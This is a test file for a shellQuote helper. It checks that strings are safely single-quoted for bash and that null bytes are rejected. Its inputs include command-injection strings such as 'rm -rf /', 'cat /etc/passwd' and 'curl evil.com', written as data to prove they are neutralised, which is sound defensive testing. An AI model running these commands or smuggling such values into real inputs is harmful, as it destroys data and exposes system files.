import { describe, expect, it } from "bun:test";
import { shellQuote } from "../gcp/gcp.js";

describe("shellQuote", () => {
  it("should wrap simple strings in single quotes", () => {
    expect(shellQuote("hello")).toBe("'hello'");
    expect(shellQuote("ls -la")).toBe("'ls -la'");
  });

  it("should escape embedded single quotes", () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
    expect(shellQuote("a'b'c")).toBe("'a'\\''b'\\''c'");
  });

  it("should handle strings with no special characters", () => {
    expect(shellQuote("simple")).toBe("'simple'");
    expect(shellQuote("/usr/bin/env")).toBe("'/usr/bin/env'");
  });

  it("should safely quote shell metacharacters", () => {
    expect(shellQuote("$(whoami)")).toBe("'$(whoami)'");
    expect(shellQuote("`id`")).toBe("'`id`'");
    expect(shellQuote("a; rm -rf /")).toBe("'a; rm -rf /'");
    expect(shellQuote("a | cat /etc/passwd")).toBe("'a | cat /etc/passwd'");
    expect(shellQuote("a && curl evil.com")).toBe("'a && curl evil.com'");
    expect(shellQuote("${HOME}")).toBe("'${HOME}'");
  });

  it("should handle double quotes inside single-quoted string", () => {
    expect(shellQuote('echo "hello"')).toBe("'echo \"hello\"'");
  });

  it("should handle empty string", () => {
    expect(shellQuote("")).toBe("''");
  });

  it("should reject null bytes (defense-in-depth)", () => {
    expect(() => shellQuote("hello\x00world")).toThrow("null bytes");
    expect(() => shellQuote("\x00")).toThrow("null bytes");
    expect(() => shellQuote("cmd\x00; rm -rf /")).toThrow("null bytes");
  });

  it("should handle strings with newlines", () => {
    const result = shellQuote("line1\nline2");
    expect(result).toBe("'line1\nline2'");
  });

  it("should handle strings with tabs", () => {
    const result = shellQuote("col1\tcol2");
    expect(result).toBe("'col1\tcol2'");
  });

  it("should handle backslashes", () => {
    expect(shellQuote("a\\b")).toBe("'a\\b'");
  });

  it("should handle multiple consecutive single quotes", () => {
    expect(shellQuote("''")).toBe("''\\'''\\'''");
  });

  it("should produce output that is safe for bash -c", () => {
    // Verify the quoting pattern: the result, when interpreted by bash,
    // should yield the original string without executing anything
    const dangerous = "$(rm -rf /)";
    const quoted = shellQuote(dangerous);
    // The quoted string wraps in single quotes, preventing expansion
    expect(quoted).toBe("'$(rm -rf /)'");
    expect(quoted.startsWith("'")).toBe(true);
    expect(quoted.endsWith("'")).toBe(true);
  });
});
